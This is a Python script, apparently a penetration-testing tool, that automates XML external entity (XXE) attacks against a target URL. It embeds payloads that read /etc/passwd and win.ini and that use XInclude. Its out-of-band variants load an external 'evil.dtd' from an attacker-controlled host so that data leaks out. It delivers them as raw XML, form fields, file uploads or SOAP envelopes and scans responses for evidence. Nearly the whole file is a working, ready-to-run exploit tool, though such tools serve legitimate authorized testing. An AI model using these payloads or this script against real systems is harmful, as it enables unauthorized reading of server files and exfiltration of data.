#!/usr/bin/env python3
import argparse
import requests
from pathlib import Path
from tqdm import tqdm
import json
import csv
import random
import string

# standard payload to read etc/passwd files
BASIC_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
"""

# standard payload to read windows initialization files
WIN_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
"""

# payload using xinclude for file reading
XINCLUDE_PAYLOAD = """<?xml version="1.0"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
"""

# oob xxe that sends an http request to an oob host
XXE_OOB_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://{OOB}/xxe">%xxe; ]>
<foo>bar</foo>
"""

# oob technique where an external dtd is loaded and defines entities that fetches a file
XXE_EXTERNAL_DTD = """<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://{OOB}/evil.dtd">
<data>&file;</data>
"""

# template to embed an xxe into a soap
SOAP_WRAPPER = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    {INNER}
  </soap:Body>
</soap:Envelope>
"""

# list of strings to parse through responses to confirm successful xxe
EVIDENCE = [
    "root:x:", "[fonts]", "daemon:", "X-XXE", "#document", "Windows Registry Editor",
    "uid=",                           
    "DOCTYPE is disallowed",
    "External Entity", "external entity",
    "EntityRef: expecting ';'",
    "SAXParseException",
    "com.sun.org.apache.xerces",
    "org.xml.sax.SAXParseException",
    "net.sf.saxon", "lxml.etree.XMLSyntaxError",
]

# sends xml data directly as the request body
def send_raw_xml(url, xml_data, headers=None, method="POST", timeout=10, allow_redirects=False, verify=True, proxies=None, content_type="application/xml"):
    h = {"Content-Type": content_type}
    if headers: h.update(headers)
    if method.upper() == "POST":
        return requests.post(url, data=xml_data.encode(), headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=verify, proxies=proxies)
    else:
        return requests.put(url, data=xml_data.encode(), headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=verify, proxies=proxies)

# sends the xml data as a value of a specified field of a request body
def send_form(url, field, xml_data, headers=None, timeout=10, allow_redirects=False, verify=True, proxies=None):
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    data = {field: xml_data}
    return requests.post(url, data=data, headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=verify, proxies=proxies)


# sends xml data as a file upload within a request
def send_multipart(url, field, filename, xml_data, headers=None, timeout=10, allow_redirects=False, verify=True, proxies=None):
    h = {}
    if headers: h.update(headers)
    files = {field: (filename, xml_data, "application/xml")}
    return requests.post(url, files=files, headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=verify, proxies=proxies)

# wraps inner xml in a soap wrapper and sends it as an application/soap+xml
def send_soap(url, inner_xml, soap_action=None, headers=None, timeout=10, allow_redirects=False, verify=True, proxies=None):
    xml = SOAP_WRAPPER.format(INNER=inner_xml)
    h = {"Content-Type": "application/soap+xml"}
    if soap_action:
        h["SOAPAction"] = soap_action
    if headers: h.update(headers)
    return requests.post(url, data=xml.encode(), headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=verify, proxies=proxies)

# generates a complete set of payloads to be tested dependent on parameters
def make_payload_matrix(oob_host=None, include_dtd=False, include_xinclude=True, include_windows=True, custom_payloads=None):
    items = []

    items.append(("unix_basic", BASIC_PAYLOAD))

    if include_windows:
        items.append(("win_basic", WIN_PAYLOAD))

    if include_xinclude:
        items.append(("xinclude", XINCLUDE_PAYLOAD))

    if oob_host:
        items.append(("oob_xxe", XXE_OOB_PAYLOAD.replace("{OOB}", oob_host)))
        if include_dtd:
            items.append(("oob_external_dtd", XXE_EXTERNAL_DTD.replace("{OOB}", oob_host)))

    if custom_payloads:
        for i, p in enumerate(custom_payloads, 1):
            items.insert(0, (f"custom_{i}", p))
    return items

# generates random alphanumeric string to be used as a filename 
def rand_name(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# takes the response body and parses through it using evidence markers to find info
def analyze_response(resp_text):
    hits = []
    for marker in EVIDENCE:
        if marker and marker in resp_text:
            hits.append(marker)
    return hits

# main function that does the xxe scanning which uses previous functions to scan and find xxe vulnerabilities
def run_tests(url, payloads, transports, opts):
    findings = []
    print(f"|*| Testing {url} with {len(payloads)} payload(s) × {len(transports)} transport(s)...")

    for (pname, xml) in tqdm(payloads, desc="Payloads"):
        for t in transports:
            mode = t["mode"]
            try:
                if mode == "raw":
                    resp = send_raw_xml(url, xml, headers=opts.headers, method=opts.method, timeout=opts.timeout,
                                        allow_redirects=opts.follow, verify=opts.verify, proxies=opts.proxies, content_type="application/xml")
                elif mode == "raw-textxml":
                    resp = send_raw_xml(url, xml, headers=opts.headers, method=opts.method, timeout=opts.timeout,
                                        allow_redirects=opts.follow, verify=opts.verify, proxies=opts.proxies, content_type="text/xml")
                elif mode == "form":
                    field = t["extra"].get("form_field", "xml")
                    resp = send_form(url, field, xml, headers=opts.headers, timeout=opts.timeout,
                                     allow_redirects=opts.follow, verify=opts.verify, proxies=opts.proxies)
                elif mode == "multipart":
                    field = t["extra"].get("file_field", "file")
                    fname = t["extra"].get("filename") or f"{rand_name()}.xml"
                    resp = send_multipart(url, field, fname, xml, headers=opts.headers, timeout=opts.timeout,
                                          allow_redirects=opts.follow, verify=opts.verify, proxies=opts.proxies)
                elif mode == "soap":
                    soap_action = t["extra"].get("soap_action")
                    resp = send_soap(url, xml, soap_action=soap_action, headers=opts.headers, timeout=opts.timeout,
                                     allow_redirects=opts.follow, verify=opts.verify, proxies=opts.proxies)
                else:
                    continue

                snippet = (resp.text or "")[:opts.snippet].replace("\n", " ")
                evidence = analyze_response(resp.text or "")
                interesting = bool(evidence) or resp.status_code not in (200, 201)
                if interesting:
                    record = {
                        "payload_name": pname,
                        "transport": mode,
                        "status": resp.status_code,
                        "length": len(resp.text or ""),
                        "evidence": evidence,
                        "snippet": snippet
                    }
                    findings.append(record)
                    if evidence:
                        print(f"|!!| {pname} via {mode} → evidence: {', '.join(evidence)}")
                    else:
                        print(f"|!| {pname} via {mode} → unusual status {resp.status_code}")
            except Exception as e:
                print(f"|x| Error [{pname} via {mode}]: {e}")

    if not findings:
        print("|*| No definite XXE indicators found. If OOB was used, check your collaborator logs.")
    else:
        print(f"\n|+| {len(findings)} finding(s). Review details above.")

    return findings

# functions to save results into json or csv formats
def save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        print(f"|+| JSON saved → {path}")
    except Exception as e:
        print(f"|x| JSON save error: {e}")

def save_csv(path, rows):
    try:
        if not rows:
            print("|*| No rows to save.")
            return
        keys = set()
        for r in rows:
            keys.update(r.keys())
        ordered = ["payload_name", "transport", "status", "length", "evidence", "snippet"]
        cols = [c for c in ordered if c in keys] + [k for k in keys if k not in ordered]
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=cols)
            w.writeheader()
            for r in rows:
                row = dict(r)
                if isinstance(row.get("evidence"), list):
                    row["evidence"] = ";".join(row["evidence"])
                w.writerow(row)
        print(f"|+| CSV saved → {path}")
    except Exception as e:
        print(f"|x| CSV save error: {e}")

# reads custom xxe payloads from a given file
def load_custom_payloads(path: str | None):
    if not path:
        return []
    p = Path(path)
    if not p.exists():
        print(f"|x| Custom payload file not found: {path}")
        return []
    try:
        return [line if line.endswith(">") else line for line in [p.read_text()] if line.strip()] if p.suffix.lower() in (".xml",) else p.read_text().splitlines()
    except Exception as e:
        print(f"|x| Error reading payloads: {e}")
        return []

class Opts:
    def __init__(self, headers, method, timeout, follow, verify, proxies, snippet):
        self.headers = headers
        self.method = method
        self.timeout = timeout
        self.follow = follow
        self.verify = verify
        self.proxies = proxies
        self.snippet = snippet

# arg parser for cli customizability
def cli():
    ap = argparse.ArgumentParser(description="Advanced XXE Exploiter (authorized testing only)")
    ap.add_argument("url", help="Target endpoint URL that parses XML")
    ap.add_argument("-p", "--payload", help="Custom payload file (XML or text)")
    ap.add_argument("--oob", help="Collaborator/OOB domain (replaces {OOB} in OOB payloads)")
    ap.add_argument("--no-windows", action="store_true", help="Skip Windows payload")
    ap.add_argument("--no-xinclude", action="store_true", help="Skip XInclude payload")
    ap.add_argument("--external-dtd", action="store_true", help="Include external DTD OOB test (requires --oob)")

    ap.add_argument("--raw", action="store_true", help="Send as application/xml")
    ap.add_argument("--raw-textxml", action="store_true", help="Send as text/xml")
    ap.add_argument("--form", metavar="FIELD", help="Send as form parameter FIELD (application/x-www-form-urlencoded)")
    ap.add_argument("--multipart", metavar="FIELD", help="Send as multipart file upload with field name FIELD")
    ap.add_argument("--filename", help="Filename to use with --multipart (default random .xml)")
    ap.add_argument("--soap", action="store_true", help="Wrap payload in a SOAP envelope")
    ap.add_argument("--soap-action", help="SOAPAction header value")

    ap.add_argument("--method", choices=["POST", "PUT"], default="POST", help="HTTP method for raw modes")
    ap.add_argument("--header", action="append", default=[], help="Extra header 'Key: Value'")
    ap.add_argument("--cookie", help="Cookie header value")
    ap.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    ap.add_argument("--timeout", type=int, default=10, help="Timeout seconds")
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS validation")

    ap.add_argument("--json-out", help="Write findings to JSON file")
    ap.add_argument("--csv-out", help="Write findings to CSV file")
    ap.add_argument("--snippet", type=int, default=220, help="Response snippet length to store (default 220)")

    args = ap.parse_args()

    headers = {}
    for hv in args.header:
        if ":" in hv:
            k, v = hv.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    # build payload sets
    custom_payloads = load_custom_payloads(args.payload)
    payloads = make_payload_matrix(
        oob_host=args.oob,
        include_dtd=args.external_dtd and bool(args.oob),
        include_xinclude=not args.no_xinclude,
        include_windows=not args.no_windows,
        custom_payloads=custom_payloads
    )

    transports = []
    if args.raw: transports.append({"mode": "raw", "extra": {}})
    if args.raw_textxml: transports.append({"mode": "raw-textxml", "extra": {}})
    if args.form: transports.append({"mode": "form", "extra": {"form_field": args.form}})
    if args.multipart: transports.append({"mode": "multipart", "extra": {"file_field": args.multipart, "filename": args.filename}})
    if args.soap: transports.append({"mode": "soap", "extra": {"soap_action": args.soap_action}})
    if not transports:
        transports = [{"mode": "raw", "extra": {}}]  # sensible default

    opts = Opts(
        headers=headers,
        method=args.method,
        timeout=args.timeout,
        follow=args.follow,
        verify=not args.insecure,
        proxies=proxies,
        snippet=args.snippet
    )

    findings = run_tests(args.url, payloads, transports, opts)

    if args.json_out:
        save_json(args.json_out, findings)
    if args.csv_out:
        save_csv(args.csv_out, findings)

if __name__ == "__main__":
    cli()
